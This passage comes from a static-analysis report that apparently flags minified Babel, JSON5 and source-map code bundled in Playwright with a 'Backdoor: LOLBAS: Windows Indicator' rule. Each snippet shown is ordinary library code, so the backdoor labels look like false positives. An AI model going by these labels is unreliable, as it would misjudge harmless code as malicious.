                    "text": "(\"toSetter\"),[m]),N.types.identifier(\"_\"))}let f=this.set(e,N.types.identifier(\"_\"));if(!N.types.isCallExpression(f)||!N.types.isIdentifier(f.arguments[f.arguments.length-1],{name:\"_\"}))throw e.buildCodeFrameError(\"Internal Babel error while compiling this code. This is a Babel bug. Please report it at https://github.com/babel/babel/issues.\");let p;return N.types.isMemberExpression(f.callee,{computed:!1})&&N.types.isIdentifier(f.callee.property)&&f.callee.property.name===\"call\"?p=[f.callee.object,N.types.arrayExpression(f.arguments.slice(1,-1)),f.arguments[0]]:p=[f.callee,N.types.arrayExpression(f",
                    "rendered": {
                      "text": "(\"toSetter\"),[m]),N.types.identifier(\"_\"))}let f=this.set(e,N.types.identifier(\"_\"));if(!N.types.isCallExpression(f)||!N.types.isIdentifier(f.arguments[f.arguments.length-1],{name:\"_\"}))throw e.buildCodeFrameError(\"Internal Babel error while compiling this code. This is a Babel bug. Please report it at https://github.com/babel/babel/issues.\");let p;return N.types.isMemberExpression(f.callee,{computed:!1})&&N.types.isIdentifier(f.callee.property)&&f.callee.property.name===\"call\"?p=[f.callee.object,N.types.arrayExpression(f.arguments.slice(1,-1)),f.arguments[0]]:p=[f.callee,N.types.arrayExpression(f",
                      "markdown": "`(\"toSetter\"),[m]),N.types.identifier(\"_\"))}let f=this.set(e,N.types.identifier(\"_\"));if(!N.types.isCallExpression(f)||!N.types.isIdentifier(f.arguments[f.arguments.length-1],{name:\"_\"}))throw e.buildCodeFrameError(\"Internal Babel error while compiling this code. This is a Babel bug. Please report it at https://github.com/babel/babel/issues.\");let p;return N.types.isMemberExpression(f.callee,{computed:!1})&&N.types.isIdentifier(f.callee.property)&&f.callee.property.name===\"call\"?p=[f.callee.object,N.types.arrayExpression(f.arguments.slice(1,-1)),f.arguments[0]]:p=[f.callee,N.types.arrayExpression(f`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1779,
                  "startColumn": 4713,
                  "endLine": 1779,
                  "endColumn": 4721,
                  "snippet": {
                    "text": "file:n,noUninitializedPrivateFieldAccess:s}=this,{name:i}=e.node.property.id,{id:a,static:o,method:l,setId:u}=r.get(i);if(!ar(n)){if(o){try{var c=n.addHelper(\"classStaticPrivateFieldDestructureSet\")}catch{throw new Error(\"Babel can not transpile `[C.#p] = [0]` with @babel/helpers < 7.13.10, \\nplease update @babel/helpers to the latest version.\")}return N.types.memberExpression(N.types.callExpression(c,[this.receiver(e),N.types.cloneNode(t),N.types.cloneNode(a)]),N.types.identifier(\"value\"))}return N.types.memberExpression(N.types.callExpression(n.addHelper(\"classPrivateFieldDestructureSet\"),[this.rece",
                    "rendered": {
                      "text": "file:n,noUninitializedPrivateFieldAccess:s}=this,{name:i}=e.node.property.id,{id:a,static:o,method:l,setId:u}=r.get(i);if(!ar(n)){if(o){try{var c=n.addHelper(\"classStaticPrivateFieldDestructureSet\")}catch{throw new Error(\"Babel can not transpile `[C.#p] = [0]` with @babel/helpers < 7.13.10, \\nplease update @babel/helpers to the latest version.\")}return N.types.memberExpression(N.types.callExpression(c,[this.receiver(e),N.types.cloneNode(t),N.types.cloneNode(a)]),N.types.identifier(\"value\"))}return N.types.memberExpression(N.types.callExpression(n.addHelper(\"classPrivateFieldDestructureSet\"),[this.rece",
                      "markdown": "`file:n,noUninitializedPrivateFieldAccess:s}=this,{name:i}=e.node.property.id,{id:a,static:o,method:l,setId:u}=r.get(i);if(!ar(n)){if(o){try{var c=n.addHelper(\"classStaticPrivateFieldDestructureSet\")}catch{throw new Error(\"Babel can not transpile `[C.#p] = [0]` with @babel/helpers < 7.13.10, \\nplease update @babel/helpers to the latest version.\")}return N.types.memberExpression(N.types.callExpression(c,[this.receiver(e),N.types.cloneNode(t),N.types.cloneNode(a)]),N.types.identifier(\"value\"))}return N.types.memberExpression(N.types.callExpression(n.addHelper(\"classPrivateFieldDestructureSet\"),[this.rece`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1779,
                  "startColumn": 535,
                  "endLine": 1779,
                  "endColumn": 543,
                  "snippet": {
                    "text": "function Qf(e,t){return N.types.callExpression(e.addHelper(\"readOnlyError\"),[N.types.stringLiteral(`#${t}`)])}function wbe(e,t){return e.availableHelper(\"writeOnlyError\")?N.types.callExpression(e.addHelper(\"writeOnlyError\"),[N.types.stringLiteral(`#${t}`)]):(console.warn(\"@babel/helpers is outdated, update it to silence this warning.\"),N.types.buildUndefinedNode())}function TE(e,t){return t?e:N.types.memberExpression(e,N.types.identifier(\"_\"))}var Dbe={memoise(e,t){let{scope:r}=e,{object:n}=e.node,s=r.maybeGenerateMemoised(n);s&&this.memoiser.set(n,s,t)},receiver(e){let{object:t}=e.node;return this.me",
                    "rendered": {
                      "text": "function Qf(e,t){return N.types.callExpression(e.addHelper(\"readOnlyError\"),[N.types.stringLiteral(`#${t}`)])}function wbe(e,t){return e.availableHelper(\"writeOnlyError\")?N.types.callExpression(e.addHelper(\"writeOnlyError\"),[N.types.stringLiteral(`#${t}`)]):(console.warn(\"@babel/helpers is outdated, update it to silence this warning.\"),N.types.buildUndefinedNode())}function TE(e,t){return t?e:N.types.memberExpression(e,N.types.identifier(\"_\"))}var Dbe={memoise(e,t){let{scope:r}=e,{object:n}=e.node,s=r.maybeGenerateMemoised(n);s&&this.memoiser.set(n,s,t)},receiver(e){let{object:t}=e.node;return this.me",
                      "markdown": "`function Qf(e,t){return N.types.callExpression(e.addHelper(\"readOnlyError\"),[N.types.stringLiteral(`#${t}`)])}function wbe(e,t){return e.availableHelper(\"writeOnlyError\")?N.types.callExpression(e.addHelper(\"writeOnlyError\"),[N.types.stringLiteral(`#${t}`)]):(console.warn(\"@babel/helpers is outdated, update it to silence this warning.\"),N.types.buildUndefinedNode())}function TE(e,t){return t?e:N.types.memberExpression(e,N.types.identifier(\"_\"))}var Dbe={memoise(e,t){let{scope:r}=e,{object:n}=e.node,s=r.maybeGenerateMemoised(n);s&&this.memoiser.set(n,s,t)},receiver(e){let{object:t}=e.node;return this.me`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1769,
                  "startColumn": 8112,
                  "endLine": 1769,
                  "endColumn": 8120,
                  "snippet": {
                    "text": "(Wge(e))return;let a=e.find(({node:R,parent:K})=>CO(K)?K.optional||K.object!==R:qge(K)?R!==e.node&&K.optional||K.callee!==R:!0);if(i.path.isPattern()){a.replaceWith(Kf(vO([],a.node),[]));return}let o=uE(a),l=a.parentPath;if(l.isUpdateExpression({argument:r}))throw e.buildCodeFrameError(\"can't handle update expression\");let u=l.isAssignmentExpression({left:a.node}),c=l.isUnaryExpression({operator:\"delete\"});if(c&&a.isOptionalMemberExpression()&&a.get(\"property\").isPrivateName())throw e.buildCodeFrameError(\"can't delete a private class element\");let f=e;for(;;){if(f.isOptionalMemberExpression()){if(f.no",
                    "rendered": {
                      "text": "(Wge(e))return;let a=e.find(({node:R,parent:K})=>CO(K)?K.optional||K.object!==R:qge(K)?R!==e.node&&K.optional||K.callee!==R:!0);if(i.path.isPattern()){a.replaceWith(Kf(vO([],a.node),[]));return}let o=uE(a),l=a.parentPath;if(l.isUpdateExpression({argument:r}))throw e.buildCodeFrameError(\"can't handle update expression\");let u=l.isAssignmentExpression({left:a.node}),c=l.isUnaryExpression({operator:\"delete\"});if(c&&a.isOptionalMemberExpression()&&a.get(\"property\").isPrivateName())throw e.buildCodeFrameError(\"can't delete a private class element\");let f=e;for(;;){if(f.isOptionalMemberExpression()){if(f.no",
                      "markdown": "`(Wge(e))return;let a=e.find(({node:R,parent:K})=>CO(K)?K.optional||K.object!==R:qge(K)?R!==e.node&&K.optional||K.callee!==R:!0);if(i.path.isPattern()){a.replaceWith(Kf(vO([],a.node),[]));return}let o=uE(a),l=a.parentPath;if(l.isUpdateExpression({argument:r}))throw e.buildCodeFrameError(\"can't handle update expression\");let u=l.isAssignmentExpression({left:a.node}),c=l.isUnaryExpression({operator:\"delete\"});if(c&&a.isOptionalMemberExpression()&&a.get(\"property\").isPrivateName())throw e.buildCodeFrameError(\"can't delete a private class element\");let f=e;for(;;){if(f.isOptionalMemberExpression()){if(f.no`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1769,
                  "startColumn": 4641,
                  "endLine": 1769,
                  "endColumn": 4649,
                  "snippet": {
                    "text": "alue.\");e=`^${e}.0.0-0`}if(typeof e!=\"string\")throw new Error(\"Expected string or integer value.\");let r=Error.stackTraceLimit;typeof r==\"number\"&&r<25&&(Error.stackTraceLimit=25);let n;throw t.slice(0,2)===\"7.\"?n=new Error(`Requires Babel \"^7.0.0-beta.41\", but was loaded with \"${t}\". You'll need to update your @babel/core version.`):n=new Error(`Requires Babel \"${e}\", but was loaded with \"${t}\". If you are sure you have a compatible version of @babel/core, it is likely that something in your build process is loading the wrong version. Inspect the stack trace of this error to look for the first entry ",
                    "rendered": {
                      "text": "alue.\");e=`^${e}.0.0-0`}if(typeof e!=\"string\")throw new Error(\"Expected string or integer value.\");let r=Error.stackTraceLimit;typeof r==\"number\"&&r<25&&(Error.stackTraceLimit=25);let n;throw t.slice(0,2)===\"7.\"?n=new Error(`Requires Babel \"^7.0.0-beta.41\", but was loaded with \"${t}\". You'll need to update your @babel/core version.`):n=new Error(`Requires Babel \"${e}\", but was loaded with \"${t}\". If you are sure you have a compatible version of @babel/core, it is likely that something in your build process is loading the wrong version. Inspect the stack trace of this error to look for the first entry ",
                      "markdown": "`alue.\");e=`^${e}.0.0-0`}if(typeof e!=\"string\")throw new Error(\"Expected string or integer value.\");let r=Error.stackTraceLimit;typeof r==\"number\"&&r<25&&(Error.stackTraceLimit=25);let n;throw t.slice(0,2)===\"7.\"?n=new Error(`Requires Babel \"^7.0.0-beta.41\", but was loaded with \"${t}\". You'll need to update your @babel/core version.`):n=new Error(`Requires Babel \"${e}\", but was loaded with \"${t}\". If you are sure you have a compatible version of @babel/core, it is likely that something in your build process is loading the wrong version. Inspect the stack trace of this error to look for the first entry `"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1751,
                  "startColumn": 2521,
                  "endLine": 1751,
                  "endColumn": 2525,
                  "snippet": {
                    "text": "then(XI):XI(r)};Lt.fromSource=function(e){var t=e.match(Lt.commentRegex);return t?Lt.fromComment(t.pop()):null};Lt.fromMapFileSource=function(e,t){if(typeof t==\"string\")throw new Error(\"String directory paths are no longer supported with `fromMapFileSource`\\nPlease review the Upgrading documentation at https://github.com/thlorenz/convert-source-map#upgrading\");var r=e.match(Lt.mapFileCommentRegex);return r?Lt.fromMapFileComment(r.pop(),t):null};Lt.removeComments=function(e){return e.replace(Lt.commentRegex,\"\")};Lt.removeMapFileComments=function(e){return e.replace(Lt.mapFileCommentRegex,\"\")};Lt.ge",
                    "rendered": {
                      "text": "then(XI):XI(r)};Lt.fromSource=function(e){var t=e.match(Lt.commentRegex);return t?Lt.fromComment(t.pop()):null};Lt.fromMapFileSource=function(e,t){if(typeof t==\"string\")throw new Error(\"String directory paths are no longer supported with `fromMapFileSource`\\nPlease review the Upgrading documentation at https://github.com/thlorenz/convert-source-map#upgrading\");var r=e.match(Lt.mapFileCommentRegex);return r?Lt.fromMapFileComment(r.pop(),t):null};Lt.removeComments=function(e){return e.replace(Lt.commentRegex,\"\")};Lt.removeMapFileComments=function(e){return e.replace(Lt.mapFileCommentRegex,\"\")};Lt.ge",
                      "markdown": "`then(XI):XI(r)};Lt.fromSource=function(e){var t=e.match(Lt.commentRegex);return t?Lt.fromComment(t.pop()):null};Lt.fromMapFileSource=function(e,t){if(typeof t==\"string\")throw new Error(\"String directory paths are no longer supported with `fromMapFileSource`\\nPlease review the Upgrading documentation at https://github.com/thlorenz/convert-source-map#upgrading\");var r=e.match(Lt.mapFileCommentRegex);return r?Lt.fromMapFileComment(r.pop(),t):null};Lt.removeComments=function(e){return e.replace(Lt.commentRegex,\"\")};Lt.removeMapFileComments=function(e){return e.replace(Lt.mapFileCommentRegex,\"\")};Lt.ge`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1751,
                  "startColumn": 2099,
                  "endLine": 1751,
                  "endColumn": 2103,
                  "snippet": {
                    "text": "ex.exec(e),r=t&&t[4]||\"uri\",new ir(e,{encoding:r,hasComment:!0})};function XI(e){return new ir(e,{isJSON:!0})}Lt.fromMapFileComment=function(e,t){if(typeof t==\"string\")throw new Error(\"String directory paths are no longer supported with `fromMapFileComment`\\nPlease review the Upgrading documentation at https://github.com/thlorenz/convert-source-map#upgrading\");var r=z0e(e,t);return r!=null&&typeof r.then==\"function\"?r.then(XI):XI(r)};Lt.fromSource=function(e){var t=e.match(Lt.commentRegex);return t?Lt.fromComment(t.pop()):null};Lt.fromMapFileSource=function(e,t){if(typeof t==\"string\")throw new Err",
                    "rendered": {
                      "text": "ex.exec(e),r=t&&t[4]||\"uri\",new ir(e,{encoding:r,hasComment:!0})};function XI(e){return new ir(e,{isJSON:!0})}Lt.fromMapFileComment=function(e,t){if(typeof t==\"string\")throw new Error(\"String directory paths are no longer supported with `fromMapFileComment`\\nPlease review the Upgrading documentation at https://github.com/thlorenz/convert-source-map#upgrading\");var r=z0e(e,t);return r!=null&&typeof r.then==\"function\"?r.then(XI):XI(r)};Lt.fromSource=function(e){var t=e.match(Lt.commentRegex);return t?Lt.fromComment(t.pop()):null};Lt.fromMapFileSource=function(e,t){if(typeof t==\"string\")throw new Err",
                      "markdown": "`ex.exec(e),r=t&&t[4]||\"uri\",new ir(e,{encoding:r,hasComment:!0})};function XI(e){return new ir(e,{isJSON:!0})}Lt.fromMapFileComment=function(e,t){if(typeof t==\"string\")throw new Error(\"String directory paths are no longer supported with `fromMapFileComment`\\nPlease review the Upgrading documentation at https://github.com/thlorenz/convert-source-map#upgrading\");var r=z0e(e,t);return r!=null&&typeof r.then==\"function\"?r.then(XI):XI(r)};Lt.fromSource=function(e){var t=e.match(Lt.commentRegex);return t?Lt.fromComment(t.pop()):null};Lt.fromMapFileSource=function(e,t){if(typeof t==\"string\")throw new Err`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1750,
                  "startColumn": 5777,
                  "endLine": 1750,
                  "endColumn": 5781,
                  "snippet": {
                    "text": "onent(escape(atob(e)))}function J0e(e){return e.split(\",\").pop()}function z0e(e,t){var r=Lt.mapFileCommentRegex.exec(e),n=r[1]||r[2];try{var e=t(n);return e!=null&&typeof e.catch==\"function\"?e.catch(s):e}catch(i){s(i)}function s(i){throw new Error(\"An error occurred while trying to read the map file at \"+n+`\n`+i.stack)}}function ir(e,t){t=t||{},t.hasComment&&(e=J0e(e)),t.encoding===\"base64\"?e=Rf(e):t.encoding===\"uri\"&&(e=decodeURIComponent(e)),(t.isJSON||t.encoding)&&(e=JSON.parse(e)),this.sourcemap=e}ir.prototype.toJSON=function(e){return JSON.stringify(this.sourcemap,null,e)};typeof Buffer!=\"und",
                    "rendered": {
                      "text": "onent(escape(atob(e)))}function J0e(e){return e.split(\",\").pop()}function z0e(e,t){var r=Lt.mapFileCommentRegex.exec(e),n=r[1]||r[2];try{var e=t(n);return e!=null&&typeof e.catch==\"function\"?e.catch(s):e}catch(i){s(i)}function s(i){throw new Error(\"An error occurred while trying to read the map file at \"+n+`\n`+i.stack)}}function ir(e,t){t=t||{},t.hasComment&&(e=J0e(e)),t.encoding===\"base64\"?e=Rf(e):t.encoding===\"uri\"&&(e=decodeURIComponent(e)),(t.isJSON||t.encoding)&&(e=JSON.parse(e)),this.sourcemap=e}ir.prototype.toJSON=function(e){return JSON.stringify(this.sourcemap,null,e)};typeof Buffer!=\"und",
                      "markdown": "`onent(escape(atob(e)))}function J0e(e){return e.split(\",\").pop()}function z0e(e,t){var r=Lt.mapFileCommentRegex.exec(e),n=r[1]||r[2];try{var e=t(n);return e!=null&&typeof e.catch==\"function\"?e.catch(s):e}catch(i){s(i)}function s(i){throw new Error(\"An error occurred while trying to read the map file at \"+n+`\n`+i.stack)}}function ir(e,t){t=t||{},t.hasComment&&(e=J0e(e)),t.encoding===\"base64\"?e=Rf(e):t.encoding===\"uri\"&&(e=decodeURIComponent(e)),(t.isJSON||t.encoding)&&(e=JSON.parse(e)),this.sourcemap=e}ir.prototype.toJSON=function(e){return JSON.stringify(this.sourcemap,null,e)};typeof Buffer!=\"und`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1717,
                  "startColumn": 2074,
                  "endLine": 1717,
                  "endColumn": 2078,
                  "snippet": {
                    "text": "lue\":Er=\"afterPropertyValue\"}function wt(e){return Gc(e===void 0?`JSON5: invalid end of input at ${Cs}:${tn}`:`JSON5: invalid character '${H2(e)}' at ${Cs}:${tn}`)}function mi(){return Gc(`JSON5: invalid end of input at ${Cs}:${tn}`)}function K2(){return tn-=5,Gc(`JSON5: invalid identifier character at ${Cs}:${tn}`)}function She(e){console.warn(`JSON5: '${H2(e)}' in strings is not valid ECMAScript; consider escaping`)}function H2(e){let t={\"'\":\"\\\\'\",'\"':'\\\\\"',\"\\\\\":\"\\\\\\\\\",\"\\b\":\"\\\\b\",\"\\f\":\"\\\\f\",\"\\n\":\"\\\\n\",\"\\r\":\"\\\\r\",\"\t\":\"\\\\t\",\"\\v\":\"\\\\v\",\"\\0\":\"\\\\0\",\"\\u2028\":\"\\\\u2028\",\"\\u2029\":\"\\\\u2029\"};if(t[e])retur",
                    "rendered": {
                      "text": "lue\":Er=\"afterPropertyValue\"}function wt(e){return Gc(e===void 0?`JSON5: invalid end of input at ${Cs}:${tn}`:`JSON5: invalid character '${H2(e)}' at ${Cs}:${tn}`)}function mi(){return Gc(`JSON5: invalid end of input at ${Cs}:${tn}`)}function K2(){return tn-=5,Gc(`JSON5: invalid identifier character at ${Cs}:${tn}`)}function She(e){console.warn(`JSON5: '${H2(e)}' in strings is not valid ECMAScript; consider escaping`)}function H2(e){let t={\"'\":\"\\\\'\",'\"':'\\\\\"',\"\\\\\":\"\\\\\\\\\",\"\\b\":\"\\\\b\",\"\\f\":\"\\\\f\",\"\\n\":\"\\\\n\",\"\\r\":\"\\\\r\",\"\t\":\"\\\\t\",\"\\v\":\"\\\\v\",\"\\0\":\"\\\\0\",\"\\u2028\":\"\\\\u2028\",\"\\u2029\":\"\\\\u2029\"};if(t[e])retur",
                      "markdown": "`lue\":Er=\"afterPropertyValue\"}function wt(e){return Gc(e===void 0?`JSON5: invalid end of input at ${Cs}:${tn}`:`JSON5: invalid character '${H2(e)}' at ${Cs}:${tn}`)}function mi(){return Gc(`JSON5: invalid end of input at ${Cs}:${tn}`)}function K2(){return tn-=5,Gc(`JSON5: invalid identifier character at ${Cs}:${tn}`)}function She(e){console.warn(`JSON5: '${H2(e)}' in strings is not valid ECMAScript; consider escaping`)}function H2(e){let t={\"'\":\"\\\\'\",'\"':'\\\\\"',\"\\\\\":\"\\\\\\\\\",\"\\b\":\"\\\\b\",\"\\f\":\"\\\\f\",\"\\n\":\"\\\\n\",\"\\r\":\"\\\\r\",\"\t\":\"\\\\t\",\"\\v\":\"\\\\v\",\"\\0\":\"\\\\0\",\"\\u2028\":\"\\\\u2028\",\"\\u2029\":\"\\\\u2029\"};if(t[e])retur`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1717,
                  "startColumn": 1990,
                  "endLine": 1717,
                  "endColumn": 1994,
                  "snippet": {
                    "text": "(){$n.pop();let e=$n[$n.length-1];e==null?Er=\"end\":Array.isArray(e)?Er=\"afterArrayValue\":Er=\"afterPropertyValue\"}function wt(e){return Gc(e===void 0?`JSON5: invalid end of input at ${Cs}:${tn}`:`JSON5: invalid character '${H2(e)}' at ${Cs}:${tn}`)}function mi(){return Gc(`JSON5: invalid end of input at ${Cs}:${tn}`)}function K2(){return tn-=5,Gc(`JSON5: invalid identifier character at ${Cs}:${tn}`)}function She(e){console.warn(`JSON5: '${H2(e)}' in strings is not valid ECMAScript; consider escaping`)}function H2(e){let t={\"'\":\"\\\\'\",'\"':'\\\\\"',\"\\\\\":\"\\\\\\\\\",\"\\b\":\"\\\\b\",\"\\f\":\"\\\\f\",\"\\n\":\"\\\\n\",\"\\r\":\"\\\\r\",",
                    "rendered": {
                      "text": "(){$n.pop();let e=$n[$n.length-1];e==null?Er=\"end\":Array.isArray(e)?Er=\"afterArrayValue\":Er=\"afterPropertyValue\"}function wt(e){return Gc(e===void 0?`JSON5: invalid end of input at ${Cs}:${tn}`:`JSON5: invalid character '${H2(e)}' at ${Cs}:${tn}`)}function mi(){return Gc(`JSON5: invalid end of input at ${Cs}:${tn}`)}function K2(){return tn-=5,Gc(`JSON5: invalid identifier character at ${Cs}:${tn}`)}function She(e){console.warn(`JSON5: '${H2(e)}' in strings is not valid ECMAScript; consider escaping`)}function H2(e){let t={\"'\":\"\\\\'\",'\"':'\\\\\"',\"\\\\\":\"\\\\\\\\\",\"\\b\":\"\\\\b\",\"\\f\":\"\\\\f\",\"\\n\":\"\\\\n\",\"\\r\":\"\\\\r\",",
                      "markdown": "`(){$n.pop();let e=$n[$n.length-1];e==null?Er=\"end\":Array.isArray(e)?Er=\"afterArrayValue\":Er=\"afterPropertyValue\"}function wt(e){return Gc(e===void 0?`JSON5: invalid end of input at ${Cs}:${tn}`:`JSON5: invalid character '${H2(e)}' at ${Cs}:${tn}`)}function mi(){return Gc(`JSON5: invalid end of input at ${Cs}:${tn}`)}function K2(){return tn-=5,Gc(`JSON5: invalid identifier character at ${Cs}:${tn}`)}function She(e){console.warn(`JSON5: '${H2(e)}' in strings is not valid ECMAScript; consider escaping`)}function H2(e){let t={\"'\":\"\\\\'\",'\"':'\\\\\"',\"\\\\\":\"\\\\\\\\\",\"\\b\":\"\\\\b\",\"\\f\":\"\\\\f\",\"\\n\":\"\\\\n\",\"\\r\":\"\\\\r\",`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1717,
                  "startColumn": 1920,
                  "endLine": 1717,
                  "endColumn": 1924,
                  "snippet": {
                    "text": "y.isArray(t)?Er=\"afterArrayValue\":Er=\"afterPropertyValue\"}}function Wc(){$n.pop();let e=$n[$n.length-1];e==null?Er=\"end\":Array.isArray(e)?Er=\"afterArrayValue\":Er=\"afterPropertyValue\"}function wt(e){return Gc(e===void 0?`JSON5: invalid end of input at ${Cs}:${tn}`:`JSON5: invalid character '${H2(e)}' at ${Cs}:${tn}`)}function mi(){return Gc(`JSON5: invalid end of input at ${Cs}:${tn}`)}function K2(){return tn-=5,Gc(`JSON5: invalid identifier character at ${Cs}:${tn}`)}function She(e){console.warn(`JSON5: '${H2(e)}' in strings is not valid ECMAScript; consider escaping`)}function H2(e){let t={\"'\":\"\\",
                    "rendered": {
                      "text": "y.isArray(t)?Er=\"afterArrayValue\":Er=\"afterPropertyValue\"}}function Wc(){$n.pop();let e=$n[$n.length-1];e==null?Er=\"end\":Array.isArray(e)?Er=\"afterArrayValue\":Er=\"afterPropertyValue\"}function wt(e){return Gc(e===void 0?`JSON5: invalid end of input at ${Cs}:${tn}`:`JSON5: invalid character '${H2(e)}' at ${Cs}:${tn}`)}function mi(){return Gc(`JSON5: invalid end of input at ${Cs}:${tn}`)}function K2(){return tn-=5,Gc(`JSON5: invalid identifier character at ${Cs}:${tn}`)}function She(e){console.warn(`JSON5: '${H2(e)}' in strings is not valid ECMAScript; consider escaping`)}function H2(e){let t={\"'\":\"\\",
                      "markdown": "`y.isArray(t)?Er=\"afterArrayValue\":Er=\"afterPropertyValue\"}}function Wc(){$n.pop();let e=$n[$n.length-1];e==null?Er=\"end\":Array.isArray(e)?Er=\"afterArrayValue\":Er=\"afterPropertyValue\"}function wt(e){return Gc(e===void 0?`JSON5: invalid end of input at ${Cs}:${tn}`:`JSON5: invalid character '${H2(e)}' at ${Cs}:${tn}`)}function mi(){return Gc(`JSON5: invalid end of input at ${Cs}:${tn}`)}function K2(){return tn-=5,Gc(`JSON5: invalid identifier character at ${Cs}:${tn}`)}function She(e){console.warn(`JSON5: '${H2(e)}' in strings is not valid ECMAScript; consider escaping`)}function H2(e){let t={\"'\":\"\\`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1717,
                  "startColumn": 1867,
                  "endLine": 1717,
                  "endColumn": 1871,
                  "snippet": {
                    "text": "ame\";else{let t=$n[$n.length-1];t==null?Er=\"end\":Array.isArray(t)?Er=\"afterArrayValue\":Er=\"afterPropertyValue\"}}function Wc(){$n.pop();let e=$n[$n.length-1];e==null?Er=\"end\":Array.isArray(e)?Er=\"afterArrayValue\":Er=\"afterPropertyValue\"}function wt(e){return Gc(e===void 0?`JSON5: invalid end of input at ${Cs}:${tn}`:`JSON5: invalid character '${H2(e)}' at ${Cs}:${tn}`)}function mi(){return Gc(`JSON5: invalid end of input at ${Cs}:${tn}`)}function K2(){return tn-=5,Gc(`JSON5: invalid identifier character at ${Cs}:${tn}`)}function She(e){console.warn(`JSON5: '${H2(e)}' in strings is not valid ECMAScr",
                    "rendered": {
